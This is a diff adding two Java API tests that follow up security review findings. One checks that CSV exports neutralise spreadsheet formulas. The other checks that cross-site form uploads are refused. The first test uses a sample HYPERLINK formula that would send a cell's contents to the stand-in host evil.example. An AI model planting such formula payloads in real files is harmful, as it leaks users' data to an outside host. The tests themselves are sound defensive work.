@@ -140,6 +140,72 @@ class ClientMetricsApiTest {
         assertThat(roundTrip.path("skipped").asInt()).isEqualTo(3);
     }
 
+    /**
+     * Review finding 2026-11-21 (CSV injection): a text cell that a spreadsheet would run as a formula is exported with a
+     * leading apostrophe, the exported file still imports as duplicates, and a jobId that is not a UUID is refused.
+     */
+    @Test
+    void formulaLikeCellsAreExportedAsTextAndJobIdsMustBeUuids() throws Exception {
+        String formula = "=HYPERLINK(\"https://evil.example/?\"&A2,\"x\")";
+        String file = HEADER + "\n"
+                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"" + formula.replace("\"", "\"\"") + "\"\n"
+                + JOB_B + ",812,6120,240,180,7480,58.3,41.0,412,@SUM(1)\n"
+                + "=1+2,812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"          // line 4: not a job id
+                + "not-a-uuid,812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n";   // line 5
+        JsonNode result = json(mvc.perform(upload(file)).andExpect(status().isOk()).andReturn());
+        assertThat(result.path("imported").asInt()).isEqualTo(2);
+        List<Integer> lines = new ArrayList<>();
+        result.path("errors").forEach(error -> {
+            lines.add(error.path("line").asInt());
+            assertThat(error.path("reason").asText()).contains("jobId");
+        });
+        assertThat(lines).containsExactly(4, 5);
+        assertThat(json(mvc.perform(get("/api/v1/admin/client-metrics")).andReturn()).get(0).path("device").asText())
+                .as("stored as sent").isEqualTo(formula);
+
+        String exported = mvc.perform(get("/api/v1/admin/client-metrics").param("format", "csv"))
+                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);
+        assertThat(exported).contains(",\"'" + formula.replace("\"", "\"\"") + "\"\r\n").contains(",'@SUM(1)\r\n");
+        for (String line : exported.split("\r\n")) {
+            for (String cell : line.split(",")) {
+                assertThat(cell).as("no cell starts like a formula").doesNotStartWith("=").doesNotStartWith("@")
+                        .doesNotStartWith("+");
+            }
+        }
+        JsonNode roundTrip = json(mvc.perform(upload(exported)).andExpect(status().isOk()).andReturn());
+        assertThat(roundTrip.path("imported").asInt()).as("the guarded export reads back as the same lines").isZero();
+        assertThat(roundTrip.path("skipped").asInt()).isEqualTo(2);
+    }
+
+    /**
+     * Review finding 2026-11-21: the import is a form POST, which a page on another site can submit with the team's
+     * cached Basic credentials. CrossSiteWriteFilter refuses v1 writes whose Sec-Fetch-Site or Origin names another
+     * site; the app and tools (no such header) and our own pages (same-origin) pass, and reads are never refused.
+     */
+    @Test
+    void writesFromAPageOfAnotherSiteAreRefused() throws Exception {
+        String file = HEADER + "\n" + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n";
+        List<MockHttpServletRequestBuilder> crossSite = List.of(
+                upload(file).header("Sec-Fetch-Site", "cross-site"),
+                upload(file).header("Sec-Fetch-Site", "same-site"),
+                upload(file).header("Origin", "https://evil.example"),
+                upload(file).header("Origin", "null"),
+                upload(file).header("Origin", "http://localhost:8081"));
+        for (MockHttpServletRequestBuilder request : crossSite) {
+            mvc.perform(request)
+                    .andExpect(status().isBadRequest())
+                    .andExpect(jsonPath("$.error.code").value("INVALID_REQUEST"));
+        }
+        assertThat(clientMetrics.count()).as("nothing stored").isZero();
+        mvc.perform(get("/api/v1/admin/client-metrics").header("Sec-Fetch-Site", "cross-site")).andExpect(status().isOk());
+
+        mvc.perform(upload(file).header("Sec-Fetch-Site", "same-origin").header("Origin", "http://localhost"))
+                .andExpect(status().isOk());
+        mvc.perform(upload(file).header("Origin", "http://localhost")).andExpect(status().isOk()); // older browser, same host
+        mvc.perform(upload(file)).andExpect(status().isOk()); // not a browser
+        assertThat(clientMetrics.count()).isEqualTo(1);
+    }
+
     @Test
     void aHeaderThatIsNotExactlyTheMetricsHeaderIsRejected() throws Exception {
         String row = JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n";
